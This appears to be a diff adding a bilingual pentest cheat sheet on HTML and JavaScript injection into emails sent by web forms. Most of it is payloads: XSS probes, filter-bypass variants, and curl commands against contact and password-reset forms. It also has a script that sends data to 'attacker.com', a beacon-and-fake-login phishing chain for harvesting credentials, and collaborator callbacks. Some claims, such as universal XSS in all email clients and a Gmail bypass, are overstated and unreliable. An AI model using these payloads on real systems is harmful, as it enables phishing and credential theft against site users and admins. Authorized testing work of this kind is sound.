@@ -1,0 +1,145 @@
+Email HTML Injection - authorized pentest এর জন্য perfect। Email client context এ JS execution + phishing এর massive impact। সব feature test করো systematically।
+
+🎯 Attack Surface Mapping
+1. Contact forms, support tickets
+2. Password reset flows  
+3. Account verification emails
+4. User invitation/referral
+5. Notification preferences (name, signature)
+6. Admin notifications (user reports)
+
+🔍 Injection Points Enumeration
+Step 1: Input Discovery
+User fields to test:
+- Full Name
+- Username/Display Name  
+- Email Signature
+- Company Name
+- Message Subject/Body
+- Custom greeting
+- Profile picture URL
+
+Step 2: HTML Injection Testing
+Basic payloads:
+"><img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+
+Advanced:
+<script>fetch('https://attacker.com/log?email='+location.href)</script>
+<iframe src=javascript:alert(document.domain)>
+
+🛠️ Testing Methodology
+Burp Suite Workflow
+1. Proxy → সব form submission capture
+2. Repeater → Name/Message fields এ HTML payloads
+3. Wait → Email delivery (5-15 mins)
+4. Check → Victim email account (your test account)
+5. Verify → JS execution + external callbacks
+
+Form Testing
+bash
+# Contact form injection
+curl -X POST "https://target.com/contact" \
+  -d "name=<img src=x onerror=alert(1)>&email=test@yourdomain.com&message=test" \
+  -b "session=your_session_cookie"
+
+# Password reset
+curl -X POST "https://target.com/reset" \
+  -d "email=test@yourdomain.com&name=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
+
+🔥 Exploitation Impact
+1. JS Execution in Email Client
+✅ Gmail/Yahoo/Outlook context
+✅ Cross-origin tracking (no CORS)
+✅ LocalStorage/SessionStorage access
+✅ Phishing link generation
+
+2. Phishing Chain
+1. Victim opens email → JS executes
+2. Beacon pixel → attacker.com/track?victim_email
+3. Fake login form overlay
+4. Credentials POST → attacker server
+
+💥 Safe PoC Demonstration
+Collaborator Integration
+html
+<!-- Injected payload -->
+<img src="https://your-unique-id.oastify.com/pixel.gif?victim=js-executed">
+<script>
+fetch('https://your-unique-id.oastify.com/log', {
+  method: 'POST',
+  body: JSON.stringify({
+    domain: location.hostname,
+    userAgent: navigator.userAgent
+  })
+});
+</script>
+
+Evidence Collection
+1. Request: POST /contact (HTML payload)
+2. Email received: Screenshot with injected content
+3. Collaborator: DNS/HTTP interaction proof
+4. HAR file: Complete request chain
+5. Video: Email open → callback hit
+
+📋 Complete Test Matrix
+Field	Basic Test	JS Test	External Resource
+Name	<b>bold</b>	<script>alert(1)</script>	<img src=//oastify.com>
+Subject	Test	"><script>confirm(1)</script>	``
+Message	<p>para</p>	<svg onload=alert(1)>	<iframe src=//oastify.com>
+Signature	``	<details ontoggle=alert(1)>	<link rel=stylesheet href=//evil.com/css>
+
+🔄 Email Client Bypass
+1. Gmail Safe Mode Bypass
+<details open ontoggle=alert(String.fromCharCode(68,79,77,65,73,78))>
+<svg><animatetransform onbegin=alert(1)>
+
+2. Outlook/Apple Mail
+<body onload=alert(1)>
+<a href=javascript:alert(1)>Click</a>
+
+🚀 Automation + Monitoring
+bash
+#!/bin/bash
+# Submit payloads
+curl -X POST "https://target.com/contact" \
+  -d "name=<img src=https://oastify.com/pixel.gif>&email=test@yourdomain.com"
+
+# Monitor collaborator
+watch -n 5 'curl https://your-unique-id.oastify.com/history'
+
+🛡️ Bypass Filters
+# HTML entity encoding
+&lt;img src=x onerror=alert(1)&gt;
+
+# Case variation
+<IMG SRC=x OnError=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>
+
+# Unicode
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+📊 Impact Scoring
+CVSS Base: 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
+
+Real Impact:
+✅ Universal XSS (all email clients)
+✅ Account enumeration (open rates)
+✅ Phishing infrastructure
+✅ Credential harvesting
+
+⚠️ Pentest Best Practices
+✅ Use YOUR controlled email (test@yourdomain.com)
+✅ Burp Collaborator for callbacks  
+✅ Video record: Request → Email → JS execution
+✅ Multiple clients test: Gmail/Outlook/Yahoo
+✅ Admin notifications target করো (higher impact)
+
+Golden Targets:
+Password reset email (name field)
+Contact support (admin receives)
+User invitation (colleagues receive)
+Account verification (new users)
+Pro Tip: Content-Type: text/html header manipulate করো form submission এ। Admin dashboard এর notification settings চেক করো।
